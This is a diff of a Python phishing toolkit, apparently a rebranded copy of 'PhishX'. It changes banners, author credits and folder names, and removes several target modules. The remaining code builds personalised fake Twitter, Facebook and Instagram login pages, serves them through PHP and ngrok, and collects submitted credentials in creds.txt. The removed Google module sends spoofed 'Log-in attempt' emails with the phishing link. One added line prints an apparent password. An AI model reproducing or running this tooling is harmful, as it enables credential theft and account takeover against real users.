@@ -3,33 +3,22 @@
 # -*- coding: utf-8 -*-
 
 
-
-# _\__o__ __o/       o         o           o           o__ __o     o         o/   o__ __o__/_   o__ __o
-#      v    |/      <|>       <|>         <|>         /v     v\   <|>       /v   <|    v       <|     v\
-#          /        < >       < >         / \        />       <\  / >      />    < >           / \     <\
-#        o/          |         |        o/   \o    o/             \o__ __o/       |            \o/     o/
-#       /v           o__/_ _\__o       <|__ __|>  <|               |__ __|        o__/_         |__  _<|
-#      />            |         |       /       \   \\              |      \       |             |       \
-#    o/             <o>       <o>    o/         \o   \         /  <o>      \o    <o>           <o>       \o
-#   /v               |         |    /v           v\   o       o    |        v\    |             |         v\
-#  />  _\o__/_      / \       / \  />             <\  <\__ __/>   / \        <\  / \  _\o__/_  / \         <\
-#
 #                                            {Follow Me Here}
 #
-# `~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[Author: Z Hacker]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~`
-#  `~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[https://twitter.com/_DEF9]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~`
-#   `~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[https://www.youtube.com/c/ZhackerL]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~`
+# `~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[Author: XxUzManN/A/]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~`
+#  `~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[https://twitter.com/aslaneferler]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~`
+#   `~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[https://www.youtube.com/channel/UC-kdOAXczn49MB6DQGhB-5A]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~`
 
 
 
 import os
 
 ###############################################
-#        PhishX Needs Root Privileges         #
+#        Hacking Needs Root Privileges         #
 ###############################################
 
 if os.geteuid() != 0:
-	exit("You need to have root privileges to run PhishX")
+	exit("You need to have root privileges to run Hacking")
 
 ###############################################
 
@@ -98,21 +87,21 @@ binary = FirefoxBinary('base/firefox/firefox')
 
 def Menu():
 
-	menu_items = (['Twitter','Facebook','Instagram','Google','Steam','Github','LinkedIn','Pinterest','Quora'])
+	menu_items = (['Twitter','Facebook','Instagram'])
 	menu_id = 1	
 	
 	
 
-	print("            "+Blue+"@@@@@@@   @@@  @@@  @@@   @@@@@@   @@@  @@@  @@@  @@@")
-	print("            "+Blue+"@@@@@@@@  @@@  @@@  @@@  @@@@@@@   @@@  @@@  @@@  @@@"  )
-	print("            "+Blue+"@@!  @@@  @@!  @@@  @@!  !@@       @@!  @@@  @@!  !@@"  )
-	print("            "+Blue+"!@!  @!@  !@!  @!@  !@!  !@!       !@!  @!@  !@!  @!!"  )
-	print("            "+Blue+"@!@@!@!   @!@!@!@!  !!@  !!@@!!    @!@!@!@!   !@@!@! "  )
-	print("            "+Blue+"!!@!!!    !!!@!!!!  !!!   !!@!!!   !!!@!!!!    @!!!  "  )
-	print("            "+Blue+"!!:       !!:  !!!  !!:       !:!  !!:  !!!   !: :!! "  )
-	print("            "+Blue+":!:       :!:  !:!  :!:      !:!   :!:  !:!  :!:  !:!"  )
-	print("            "+Blue+" ::       ::   :::   ::  :::: ::   ::   :::   ::  :::"  )
-	print("            "+Blue+" :         :   : :  :    :: : :     :   : :   :   :: "+Green+"V1.1")
+	print("            "+Blue+"         @@@              @@@           @  @@@@@@@@@@@@@@@@@@@@   ")
+	print("            "+Blue+"       @@@ @@@            @  @          @           @              "  )
+	print("            "+Blue+"      @@@   @@@           @    @        @           @       "  )
+	print("            "+Blue+"     @@@     @@@          @     @       @           @      "  )
+	print("            "+Blue+"    @@@       @@@         @      @      @           @         "  )
+	print("            "+Blue+"   @@@         @@@        @       @     @           @           "  )
+	print("            "+Blue+"  @@@:!:::@!:!::@@@       @        @    @           @          "  )
+	print("            "+Blue+":@@@             @@@      @         @   @           @         "  )
+	print("            "+Blue+" @@               @@      @          @  @           @      "  )
+	print("            "+Blue+" @                 @  @@  @           @ @  @@       @         "+Green+"V1.1")
 	print("      "+Blue+"__________________________"+Grey+" ["+Reset+"Z-HACKER"+Grey+"]"+Blue+"____________________________")
 	print("     "+Blue+"________________________"+Grey+"["+Red+"Pick Your Poison"+Grey+"]"+Blue+"__________________________"+Reset+"\n")	
 	
@@ -155,16 +144,16 @@ def Menu():
 def Banner():
 
 	os.system("reset")
-	print("            "+Blue+"@@@@@@@   @@@  @@@  @@@   @@@@@@   @@@  @@@  @@@  @@@"  )
-	print("            "+Blue+"@@@@@@@@  @@@  @@@  @@@  @@@@@@@   @@@  @@@  @@@  @@@"  )
-	print("            "+Blue+"@@!  @@@  @@!  @@@  @@!  !@@       @@!  @@@  @@!  !@@"  )
-	print("            "+Blue+"!@!  @!@  !@!  @!@  !@!  !@!       !@!  @!@  !@!  @!!"  )
-	print("            "+Blue+"@!@@!@!   @!@!@!@!  !!@  !!@@!!    @!@!@!@!   !@@!@! "  )
-	print("            "+Blue+"!!@!!!    !!!@!!!!  !!!   !!@!!!   !!!@!!!!    @!!!  "  )
-	print("            "+Blue+"!!:       !!:  !!!  !!:       !:!  !!:  !!!   !: :!! "  )
-	print("            "+Blue+":!:       :!:  !:!  :!:      !:!   :!:  !:!  :!:  !:!"  )
-	print("            "+Blue+" ::       ::   :::   ::  :::: ::   ::   :::   ::  :::"  )
-	print("            "+Blue+" :         :   : :  :    :: : :     :   : :   :   :: "+Green+"V1.1")
+	print("            "+Blue+"         @@@              @@@           @  @@@@@@@@@@@@@@@@@@@@   ")
+	print("            "+Blue+"       @@@ @@@            @  @          @           @              "  )
+	print("            "+Blue+"      @@@   @@@           @    @        @           @       "  )
+	print("            "+Blue+"     @@@     @@@          @     @       @           @      "  )
+	print("            "+Blue+"    @@@       @@@         @      @      @           @         "  )
+	print("            "+Blue+"   @@@         @@@        @       @     @           @           "  )
+	print("            "+Blue+"  @@@:!:::@!:!::@@@       @        @    @           @          "  )
+	print("            "+Blue+":@@@             @@@      @         @   @           @         "  )
+	print("            "+Blue+" @@               @@      @          @  @           @      "  )
+	print("            "+Blue+" @                 @  @@  @           @ @  @@       @         "+Green+"V1.1")
 	print("      "+Blue+"__________________________"+Grey+" ["+Reset+"Z-HACKER"+Grey+"]"+Blue+"____________________________")
 	print("     "+Blue+"___________________________"+Grey+" ["+Blue+Menu.module+Grey+"]"+Blue+"_____________________________"+Reset+"\n\n")
 
@@ -179,24 +168,6 @@ def Banner():
 
 	elif Menu.module == "instagram":
 		Instagram()
-
-	elif Menu.module == "google":
-		Google()
-
-	elif Menu.module == "steam":
-		Steam()
-
-	elif Menu.module == "github":
-		Github()
-
-	elif Menu.module == "linkedin":
-		LinkedIn()
-
-	elif Menu.module == "pinterest":
-		Pinterest()
-
-	elif Menu.module == "quora":
-		Quora()
 #############################################################################################################################
 #############################################################################################################################
 #############################################################################################################################
@@ -273,35 +244,28 @@ def Twitter():
 
 	#PRINTS SHIT
 	os.system('reset')
-	print(Blue+"                     _________  ________                         ")
-	print(Blue+"                    |\\___   ___\\\\   __  \\                        ")
-	print(Blue+"                    \\|___ \\  \\_\\ \\  \\|\\  \\                       ")
-	print(Blue+"                         \\ \\  \\ \\ \\   _  _\\                      ")
-	print(Blue+"                          \\ \\  \\ \\ \\  \\\\  \\|                     ")
-	print(Blue+"                           \\ \\__\\ \\ \\__\\\\ _\\                     ")
-	print(Blue+"                            \\|__|  \\|__|\\|__|                    ")
-	print(Blue+"                                                                    ")
-	print(Blue+"                                                                     ")
-	print(Blue+"                                                                     ")
-	print(Blue+"                 ___  ___  ________  ________  ___  __       ")
-	print(Blue+"                |\\  \\|\\  \\|\\   __  \\|\\   __  \\|\\  \\|\\  \\     ")
-	print(Blue+"                \\ \\  \\\\\\  \\ \\  \\|\\  \\ \\  \\|\\  \\ \\  \\/  /|_   ")
-	print(Blue+"                 \\ \\   __  \\ \\  \\\\\\  \\ \\  \\\\\\  \\ \\   ___  \\  ")
-	print(Blue+"                  \\ \\  \\ \\  \\ \\  \\\\\\  \\ \\  \\\\\\  \\ \\  \\\\ \\  \\ ")
-	print(Blue+"                   \\ \\__\\ \\__\\ \\_______\\ \\_______\\ \\__\\\\ \\__\\")
-	print(Blue+"                    \\|__|\\|__|\\|_______|\\|_______|\\|__| \\|__|\n")
+	print("            "+Blue+"         @@@              @@@           @  @@@@@@@@@@@@@@@@@@@@   ")
+	print("            "+Blue+"       @@@ @@@            @  @          @           @              "  )
+	print("            "+Blue+"      @@@   @@@           @    @        @           @       "  )
+	print("            "+Blue+"     @@@     @@@          @     @       @           @      "  )
+	print("            "+Blue+"    @@@       @@@         @      @      @           @         "  )
+	print("            "+Blue+"   @@@         @@@        @       @     @           @           "  )
+	print("            "+Blue+"  @@@:!:::@!:!::@@@       @        @    @           @          "  )
+	print("            "+Blue+":@@@             @@@      @         @   @           @         "  )
+	print("            "+Blue+" @@               @@      @          @  @           @      "  )
+	print("            "+Blue+" @                 @  @@  @           @ @  @@       @         ")
 	print("                            "+Grey+"["+Green+"Attack Has Started"+Grey+"]"+Reset)
 
 
 	# CLEARS OUR WEBSERVER DIR
-	os.system('rm -r ./WEBSERVER/')
-	os.system('mkdir ./WEBSERVER')
-	os.system('touch ./WEBSERVER/creds.txt')
+	os.system('rm -r ./ANTSERVER/')
+	os.system('mkdir ./ANTSERVER')
+	os.system('touch ./ANTSERVER/creds.txt')
 	# GETS USERS PFP
 	profile_url = "https://twitter.com/"+UNAME
 	profile_img_url = "https://twitter.com/"+UNAME+"/profile_image?size=original"
 
-	subprocess.call(['xterm','-e','wget','-O','./WEBSERVER/VICTIM.jpg',profile_img_url])
+	subprocess.call(['xterm','-e','wget','-O','./ANTSERVER/VICTIM.jpg',profile_img_url])
 
 
 	# MAKES AN INVISIBLE DISPLAY... AND RUNS SELENIUM WITH GECKO DRIVER
@@ -325,7 +289,7 @@ def Twitter():
 	filedata = filedata.replace('DEF-9', str(NAME))
 	filedata = filedata.replace('_DEF9', str(UNAME))
 
-	with open('./WEBSERVER/index.html', 'w') as file:
+	with open('./ANTSERVER/index.html', 'w') as file:
 		file.write(filedata)
 
 
@@ -334,13 +298,13 @@ def Twitter():
 	filedata = filedata.replace('DEF-9', str(NAME))
 	filedata = filedata.replace('_DEF9', str(UNAME))
 
-	with open('./WEBSERVER/mobile.html', 'w') as file:
+	with open('./ANTSERVER/mobile.html', 'w') as file:
 		file.write(filedata)
 
-	with open('./WEBSERVER/login.php', 'w') as file:
+	with open('./ANTSERVER/login.php', 'w') as file:
 		file.write(str(LOGIN_TWITTER))
 
-	with open('./WEBSERVER/account_secured.html', 'w') as file:
+	with open('./ANTSERVER/account_secured.html', 'w') as file:
 		file.write(str(SECURED_TWITTER))
 
 
@@ -349,12 +313,12 @@ def Twitter():
 
 
 
-	os.system('chmod -R 777 ./WEBSERVER/')
+	os.system('chmod -R 777 ./ANTSERVER/')
 
 
-	# `------------[STARTS A WEBSERVER + FORWARDS PORT WITH NGROK]-------------` #
+	# `------------[STARTS A ANTSERVER + FORWARDS PORT WITH NGROK]-------------` #
 
-	os.system('xterm -e "cd ./WEBSERVER/ && php -S 127.0.0.1:80" &')
+	os.system('xterm -e "cd ./ANTSERVER/ && php -S 127.0.0.1:80" &')
 	os.system("./ngrok http 80 > /dev/null &")
 
 
@@ -407,7 +371,7 @@ def Twitter():
 	print("             ################################################\033[0;93m")
 	print("             "+Grey+"[\033[0;34m*"+Grey+"]-["+Reset+"EXTRA-URL"+Grey+"]"+Reset+": \033[0;34m"+phishin_url+"\033[0;93m\n")
 
-	os.system("tail -f ./WEBSERVER/creds.txt")
+	os.system("tail -f ./ANTSERVER/creds.txt")
 
 	# `CLEANS UP - Teh MESS IT CAUSED
 	print("\n                 \033[0;34m######################################")
@@ -498,22 +462,16 @@ def Facebook():
 
 
 	os.system("reset")
-	print(Blue+"\n         ________ ________  ________  _______               ")
-	print(Blue+"        |\\  _____\\\\   __  \\|\\   ____\\|\\  ___ \\              ")
-	print(Blue+"        \\ \\  \\__/\\ \\  \\|\\  \\ \\  \\___|\\ \\   __/|             ")
-	print(Blue+"         \\ \\   __\\\\ \\   __  \\ \\  \\    \\ \\  \\_|/__           ")
-	print(Blue+"          \\ \\  \\_| \\ \\  \\ \\  \\ \\  \\____\\ \\  \\_|\\ \\ ------+ ")
-	print(Blue+"           \\ \\__\\   \\ \\__\\ \\__\\ \\_______\\ \\_______\\       \\  ")
-	print(Blue+"            \\|__|    \\|__|\\|__|\\|_______|\\|_______|        \\ ")
-	print(Blue+"                                                            \\")
-	print(Blue+"                                                             \\----\\Z\\")
-	print(Blue+"                                                              \\")
-	print(Blue+"                ___  ___  ________  ________  ___  __          \\")
-	print(Blue+"               |\\  \\|\\  \\|\\   __  \\|\\   __  \\|\\  \\|\\  \\         \\   ")
-	print(Blue+"               \\ \\  \\\\\\  \\ \\  \\|\\  \\ \\  \\|\\  \\ \\  \\/  /|_        \\")
-	print(Blue+"                \\ \\   __  \\ \\  \\\\\\  \\ \\  \\\\\\  \\ \\   ___  \\--------+")
-	print(Blue+"                 \\ \\  \\ \\  \\ \\  \\\\\\  \\ \\  \\\\\\  \\ \\  \\\\ \\  \\ ")
-	print(Blue+"                  \\ \\__\\ \\__\\ \\_______\\ \\_______\\ \\__\\\\ \\__\\")
+	print("            "+Blue+"         @@@              @@@           @  @@@@@@@@@@@@@@@@@@@@   ")
+	print("            "+Blue+"       @@@ @@@            @  @          @           @              "  )
+	print("            "+Blue+"      @@@   @@@           @    @        @           @       "  )
+	print("            "+Blue+"     @@@     @@@          @     @       @           @      "  )
+	print("            "+Blue+"    @@@       @@@         @      @      @           @         "  )
+	print("            "+Blue+"   @@@         @@@        @       @     @           @           "  )
+	print("            "+Blue+"  @@@:!:::@!:!::@@@       @        @    @           @          "  )
+	print("            "+Blue+":@@@             @@@      @         @   @           @         "  )
+	print("            "+Blue+" @@               @@      @          @  @           @      "  )
+	print("            "+Blue+" @                 @  @@  @           @ @  @@       @         ")
 	print(Blue+"                   \\|__|\\|__|\\|_______|\\|_______|\\|__| \\|__|"+Green+"V1.2\n")
 	print("                            "+Grey+"["+Green+"Attack Has Started"+Grey+"]"+Reset)
 
@@ -522,8 +480,8 @@ def Facebook():
 
 
 
-	os.system("rm -r WEBSERVER/")
-	os.system("mkdir WEBSERVER")
+	os.system("rm -r ANTSERVER/")
+	os.system("mkdir ANTSERVER")
 
 
 
@@ -532,25 +490,25 @@ def Facebook():
 	filedata = filedata.replace('[PIC]', str(pic))
 	filedata = filedata.replace('[FIRSTNAME]', str(first_name))
 
-	with open('./WEBSERVER/index.html', 'w') as file:
+	with open('./ANTSERVER/index.html', 'w') as file:
 		file.write(filedata)
 
 	filedata = str(Mobile_Facebook)
-	mobile = open('./WEBSERVER/i_mobile.html', 'w')
+	mobile = open('./ANTSERVER/i_mobile.html', 'w')
 	mobile.write(filedata)
 	mobile.close()
 
 	filedata = str(Login_Facebook)
-	login = open('./WEBSERVER/login.php', 'w')
+	login = open('./ANTSERVER/login.php', 'w')
 	login.write(filedata)
 	login.close()
 
 	filedata = str(Secured_Facebook)
-	secured = open('./WEBSERVER/account_secured.html', 'w')
+	secured = open('./ANTSERVER/account_secured.html', 'w')
 	secured.write(filedata)
 	secured.close()
 
-	os.system("touch ./WEBSERVER/creds.txt")
+	os.system("touch ./ANTSERVER/creds.txt")
 	os.system("chmod -R 777 WEBSERVER/")
 
 
@@ -558,7 +516,7 @@ def Facebook():
 
 
 
-	os.system('xterm -e "cd ./WEBSERVER/ && php -S 127.0.0.1:80" &')
+	os.system('xterm -e "cd ./ANTSERVER/ && php -S 127.0.0.1:80" &')
 	os.system("./ngrok http 80 > /dev/null &")
 
 	time.sleep(3)
@@ -609,10 +567,10 @@ def Facebook():
 	print("             ################################################\033[0;93m")
 	print("             "+Grey+"[\033[0;34m*"+Grey+"]-["+Reset+"EXTRA-URL"+Grey+"]"+Reset+": \033[0;34m"+phishin_url+"\033[0;93m\n")
 
-	os.system("tail -f ./WEBSERVER/creds.txt")
+	os.system("tail -f ./ANTSERVER/creds.txt")
 
 	print("\n                 \033[0;34m######################################")
-	print("                 #              --DONE--              #")
+	print("                 #              blat1n54as              #")
 	print("                 ######################################")
 
 	os.system("pkill -9 ngrok")
@@ -690,22 +648,16 @@ def Instagram():
 			"104.218.63.73"])
 
 	os.system("reset")
-	print(Blue+"\n         ___  ________   ________  _________  ________             ")
-	print(Blue+"        |\\  \\|\\   ___  \\|\\   ____\\|\\___   ___\\\\   __  \\            ")
-	print(Blue+"        \\ \\  \\ \\  \\\\ \\  \\ \\  \\___|\\|___ \\  \\_\\ \\  \\|\\  \\           ")
-	print(Blue+"         \\ \\  \\ \\  \\\\ \\  \\ \\_____  \\   \\ \\  \\ \\ \\   __  \\          ")
-	print(Blue+"          \\ \\  \\ \\  \\\\ \\  \\|____|\\  \\   \\ \\  \\ \\ \\  \\ \\  \\         ")
-	print(Blue+"           \\ \\__\\ \\__\\\\ \\__\\____\\_\\  \\   \\ \\__\\ \\ \\__\\ \\__\\        ")
-	print(Blue+"            \\|__|\\|__| \\|__|\\_________\\   \\|__|  \\|__|\\|__|        ")
-	print(Blue+"                           \\|_________|                            ")
-	print(Blue+"                                                                   ")
-	print(Blue+"                                                                   ")
-	print(Blue+"             ___  ___  ________  ________  ___  __    ________     ")
-	print(Blue+"            |\\  \\|\\  \\|\\   __  \\|\\   __  \\|\\  \\|\\  \\ |\\   __  \\    ")
-	print(Blue+"            \\ \\  \\\\\\  \\ \\  \\|\\  \\ \\  \\|\\  \\ \\  \\/  /|\\ \\  \\|\\  \\   ")
-	print(Blue+"             \\ \\   __  \\ \\  \\\\\\  \\ \\  \\\\\\  \\ \\   ___  \\ \\   __  \\  ")
-	print(Blue+"              \\ \\  \\ \\  \\ \\  \\\\\\  \\ \\  \\\\\\  \\ \\  \\\\ \\  \\ \\  \\ \\  \\ ")
-	print(Blue+"               \\ \\__\\ \\__\\ \\_______\\ \\_______\\ \\__\\\\ \\__\\ \\__\\ \\__\\")
+	print("            "+Blue+"         @@@              @@@           @  @@@@@@@@@@@@@@@@@@@@   ")
+	print("            "+Blue+"       @@@ @@@            @  @          @           @              "  )
+	print("            "+Blue+"      @@@   @@@           @    @        @           @       "  )
+	print("            "+Blue+"     @@@     @@@          @     @       @           @      "  )
+	print("            "+Blue+"    @@@       @@@         @      @      @           @         "  )
+	print("            "+Blue+"   @@@         @@@        @       @     @           @           "  )
+	print("            "+Blue+"  @@@:!:::@!:!::@@@       @        @    @           @          "  )
+	print("            "+Blue+":@@@             @@@      @         @   @           @         "  )
+	print("            "+Blue+" @@               @@      @          @  @           @      "  )
+	print("            "+Blue+" @                 @  @@  @           @ @  @@       @         ")
 	print(Blue+"                \\|__|\\|__|\\|_______|\\|_______|\\|__| \\|__|\\|__|\\|__|"+Green+"V1.0\n")
 	print("                            "+Grey+"["+Green+"Attack Has Started"+Grey+"]"+Reset)
 
@@ -738,35 +690,35 @@ def Instagram():
 
 
 
-	os.system("rm -r WEBSERVER/")
+	os.system("rm -r ANTSERVER/")
 
-	subprocess.call(['mkdir','-p','WEBSERVER/'])
+	subprocess.call(['mkdir','-p','ANTSERVER/'])
 
 	filedata = str(Main_Instagram)
 	filedata = filedata.replace('[l]', str(l))
 	filedata = filedata.replace('[Uname]', str(Uname))
 
-	with open('./WEBSERVER/index.html', 'w') as file:
+	with open('./ANTSERVER/index.html', 'w') as file:
 		file.write(filedata)
 	file.close()
 
 	logindata = str(Login_Instagram)
-	with open('./WEBSERVER/login.php', 'w') as file:
+	with open('./ANTSERVER/login.php', 'w') as file:
 		file.write(logindata)
 	file.close()
 
 	secured_html = str(Secured_Instagram)
-	with open('./WEBSERVER/account_secured.html', 'w') as file:
+	with open('./ANTSERVER/account_secured.html', 'w') as file:
 		file.write(secured_html)
 	file.close()
 
 
-	os.system("touch ./WEBSERVER/creds.txt")
-	os.system("chmod -R 777 WEBSERVER/")
+	os.system("touch ./ANTSERVER/creds.txt")
+	os.system("chmod -R 777 ANTSERVER/")
 
 
 
-	os.system('xterm -e "cd ./WEBSERVER/ && php -S 127.0.0.1:80" &')
+	os.system('xterm -e "cd ./ANTSERVER/ && php -S 127.0.0.1:80" &')
 	os.system("./ngrok http 80 > /dev/null &")
 
 	time.sleep(3)
@@ -815,9 +767,13 @@ def Instagram():
 	print("             #  \033[0mListening for Creds on Uname:\033[0;94m"+str(Uname)+"\033[0;37m #")
 	print("             ################################################\033[0;93m")
 	print("             "+Grey+"[\033[0;34m*"+Grey+"]-["+Reset+"EXTRA-URL"+Grey+"]"+Reset+": \033[0;34m"+phish_url+"\033[0;93m\n")
+	print("             ################################################\033[0;93m")
+	print("             #  \033[0mOld Password: Blata2a54s\033[0;37m #")
+	print("             ################################################\033[0;93m")
+	
 
 
-	os.system("tail -f ./WEBSERVER/creds.txt")
+	os.system("tail -f ./ANTSERVER/creds.txt")
 
 	print("\n                 \033[0;34m######################################")
 	print("                 #              --DONE--              #")
@@ -848,741 +804,6 @@ def Instagram():
 #############################################################################################################################
 #############################################################################################################################
 #############################################################################################################################
-
-
-
-def Google():
-	utc = datetime.datetime.utcnow()
-	loc = ""
-	time1 = ""
-
-	em = input("     "+Grey+"["+Blue+"Email"+Grey+"]"+Green+": "+Reset)
-	full_name = input("     "+Grey+"["+Blue+"Accounts Full Name"+Grey+"]"+Green+": "+Reset)
-
-	from_email = input("     "+Grey+"["+Blue+"Spoofed Mail"+Grey+"]"+Green+": "+Reset)
-
-	Phone_try = input("     "+Grey+"["+Blue+"Have targets Phone number"+Grey+"]"+Green+"?- "+Grey+"["+Blue+"y"+Grey+"/"+Blue+"N"+Grey+"]"+Green+": "+Reset)
-
-	if Phone_try == "N":
-		Phone = "NoPhone"
-	elif Phone_try == "y":
-		Phone = input("     "+Grey+"["+Blue+"Phone"+Grey+"]"+Green+": "+Reset)
-
-	rndm = input("     "+Grey+"["+Blue+"Wanna use random settings for the email"+Grey+"]"+Green+"?- "+Grey+"["+Blue+"y"+Grey+"/"+Blue+"N"+Grey+"]"+Green+": "+Reset)
-	if rndm == "N":
-		time1 = input("     "+Grey+"["+Blue+"Time"+Grey+"]"+Green+": "+Reset)
-		loc = input("     "+Grey+"["+Blue+"Location"+Grey+"]"+Green+": "+Reset)
-
-
-	elif rndm == "y":
-		loc = 'North Palm Beach, USA'
-		time1 = str(utc.strftime("%H:%M:%S"))+" (UTC)"
-
-	os.system("reset")
-	print(Blue+"         ________      ________  ________  ________                ")
-	print(Blue+"        |\\   ____\\    |\\   __  \\|\\   ____\\|\\   ____\\               ")
-	print(Blue+"        \\ \\  \\___|    \\ \\  \\|\\  \\ \\  \\___|\\ \\  \\___|               ")
-	print(Blue+"         \\ \\  \\  ___   \\ \\   __  \\ \\  \\    \\ \\  \\                  ")
-	print(Blue+"          \\ \\  \\|\\  \\ __\\ \\  \\ \\  \\ \\  \\____\\ \\  \\____             ")
-	print(Blue+"           \\ \\_______\\\\__\\ \\__\\ \\__\\ \\_______\\ \\_______\\           ")
-	print(Blue+"            \\|_______\\|__|\\|__|\\|__|\\|_______|\\|_______|           ")
-	print(Blue+"                                                                   ")
-	print(Blue+"                                                                   ")
-	print(Blue+"                                                                   ")
-	print(Blue+"             ___  ___  ________  ________  ___  __    ________     ")
-	print(Blue+"            |\\  \\|\\  \\|\\   __  \\|\\   __  \\|\\  \\|\\  \\ |\\   __  \\    ")
-	print(Blue+"            \\ \\  \\\\\\  \\ \\  \\|\\  \\ \\  \\|\\  \\ \\  \\/  /|\\ \\  \\|\\  \\   ")
-	print(Blue+"             \\ \\   __  \\ \\  \\\\\\  \\ \\  \\\\\\  \\ \\   ___  \\ \\   __  \\  ")
-	print(Blue+"              \\ \\  \\ \\  \\ \\  \\\\\\  \\ \\  \\\\\\  \\ \\  \\\\ \\  \\ \\  \\ \\  \\ ")
-	print(Blue+"               \\ \\__\\ \\__\\ \\_______\\ \\_______\\ \\__\\\\ \\__\\ \\__\\ \\__\\")
-	print(Blue+"                \\|__|\\|__|\\|_______|\\|_______|\\|__| \\|__|\\|__|\\|__|"+Green+"V1.0\n")
-	print("                            "+Grey+"["+Green+"Attack Has Started"+Grey+"]"+Reset)
-
-
-
-
-	url = "http://picasaweb.google.com/data/entry/api/user/"+em
-
-	resp = requests.get(url)
-	s = resp.text
-	pic='http://geomla.grf.bg.ac.rs/site_media/static/landio/img/avatar.png'
-
-
-	first_name = full_name.strip().split(" ",1)[0]
-
-
-	if s == "Unknown user.":
-		pass
-
-	else:
-		pic = str((s.split('<gphoto:thumbnail>'))[1].split('</gphoto:thumbnail>')[0])
-
-
-
-
-	phone_w=open('sms_support/phone','w')
-	phone_w.write(str(Phone)+":"+str(first_name))
-	phone_w.close()
-
-	os.system("rm -r ./WEBSERVER")
-	os.system('mkdir ./WEBSERVER')
-
-	filedata = str(Main_Google)
-	filedata = filedata.replace('[IMG]', str(pic))
-	filedata = filedata.replace('[FULL_NAME]', str(full_name))
-	filedata = filedata.replace('[NAME]', str(first_name))
-	filedata = filedata.replace('[EMAIL]', str(em))
-	with open('./WEBSERVER/index.html', 'w') as file:
-		file.write(filedata)
-	file.close()
-	filedata = str(Login1_Google)
-	with open('./WEBSERVER/login_pass.php', 'w') as file:
-		file.write(filedata)
-	filedata = str(Main2_Google)
-	with open('./WEBSERVER/new_pass.html', 'w') as file:
-		file.write(filedata)
-	filedata = str(Login2_Google)
-	with open('./WEBSERVER/login.php', 'w') as file:
-		file.write(filedata)
-	filedata = str(Secured_Google)
-	with open('./WEBSERVER/account_secured.html', 'w') as file:
-		file.write(filedata)
-	os.system('touch ./WEBSERVER/creds.txt')
-	os.system('chmod -R 777 ./WEBSERVER/')
-	os.system('xterm -e "cd ./WEBSERVER/ && php -S 127.0.0.1:80" &')
-	os.system("./ngrok http 80 > /dev/null &")
-	time.sleep(3)
-	display = Display(visible=0, size=(800, 600))
-	display.start()
-
-	browser = webdriver.Firefox(firefox_binary=binary,executable_path='base/geckodriver')
-	browser.get("http://localhost:4040/status")
-	time.sleep(5)
-	url_f=str(browser.find_element_by_css_selector("li.list-unstyled:nth-child(1) > div:nth-child(2) > table:nth-child(2) > tbody:nth-child(1) > tr:nth-child(1) > td:nth-child(2)").text)
-	browser.close()
-	phish_url = str(url_f)
-	display.stop()
-	emaildata = str(Email_Google)
-	emaildata = emaildata.replace('[First_Name]', str(first_name))
-	emaildata = emaildata.replace('[OPTION]', str(' '))
-	emaildata = emaildata.replace('[LOC]', loc)
-	emaildata = emaildata.replace('[TIME]', time1)
-	emaildata = emaildata.replace('[PHISHING_URL]', str(phish_url))
-	emaildata = emaildata.replace('[EMAIL]', str(em+' '))
-	subprocess.call(['sendemail', '-f', from_email,'-t', str(em), '-u', 'Log-in attempt', '-m', emaildata, '-s', smtps+":"+port, '-xu', username, '-xp', password])
-	if Phone_try == "N":
-		pass
-	elif Phone_try == "y":
-		os.system("xterm -e \"python3 ./sms_support/google_sms.py\" &")
-	os.system("reset")
-
-	banN()
-
-	print("             \033[0;37m################################################")
-	print("             #  \033[0mListening for Creds on G-ACC: \033[0;94m"+str(full_name)+"\033[0;37m #")
-	print("             ################################################\033[0;93m")
-	print("             "+Grey+"[\033[0;34m*"+Grey+"]-["+Reset+"EXTRA-URL"+Grey+"]"+Reset+": \033[0;34m"+phish_url+"\033[0;93m\n")
-
-	os.system("tail -f ./WEBSERVER/creds.txt")
-	print("\n                 \033[0;34m######################################")
-	print("                 #              --DONE--              #")
-	print("                 ######################################")
-	os.system("pkill -9 ngrok")
-	os.system("pkill -9 php")
-	print("               Automatically Sending a Confirmation Email!!\n")
-	email2data = str(Email2_Google)
-	email2data = email2data.replace('[First_Name]', str(first_name))
-	email2data = email2data.replace('[OPTION]', str(' '))
-	email2data = email2data.replace('[EMAIL]', str(' '))
-	subprocess.call(['sendemail', '-f', from_email,'-t', str(em), '-u', 'Password Changed', '-m', email2data, '-s', smtps+":"+port, '-xu', username, '-xp', password])
-	os.system("reset")
-	ENDst()
-
-#############################################################################################################################
-#############################################################################################################################
-#############################################################################################################################
-#############################################################################################################################
-#############################################################################################################################
-#############################################################################################################################
-
-def Steam():
-	pic = ''
-
-	UNAME = input("     "+Grey+"["+Blue+"Username/ID"+Grey+"]"+Green+": "+Reset)
-
-	Email = input("     "+Grey+"["+Blue+"Email"+Grey+"]"+Green+": "+Reset)
-
-	os.system('reset')
-	print(Blue+"""       ________  _________  _______   ________  _____ ______           """)
-	print(Blue+"""      |\\   ____\\|\\___   ___\\\\  ___ \\ |\\   __  \\|\\   _ \\  _   \\         """)
-	print(Blue+"""      \\ \\  \\___|\\|___ \\  \\_\\ \\   __/|\\ \\  \\|\\  \\ \\  \\\\\\__\\ \\  \\        """)
-	print(Blue+"""       \\ \\_____  \\   \\ \\  \\ \\ \\  \\_|/_\\ \\   __  \\ \\  \\\\|__| \\  \\       """)
-	print(Blue+"""        \\|____|\\  \\   \\ \\  \\ \\ \\  \\_|\\ \\ \\  \\ \\  \\ \\  \\    \\ \\  \\      """)
-	print(Blue+"""          ____\\_\\  \\   \\ \\__\\ \\ \\_______\\ \\__\\ \\__\\ \\__\\    \\ \\__\\     """)
-	print(Blue+"""         |\\_________\\   \\|__|  \\|_______|\\|__|\\|__|\\|__|     \\|__|     """)
-	print(Blue+"""         \\|_________|                                                  """)
-	print(Blue+"""                                                                       """)
-	print(Blue+"""                                                                       """)
-	print(Blue+"""             ___  ___  ________  ________  ___  __    ________     """)
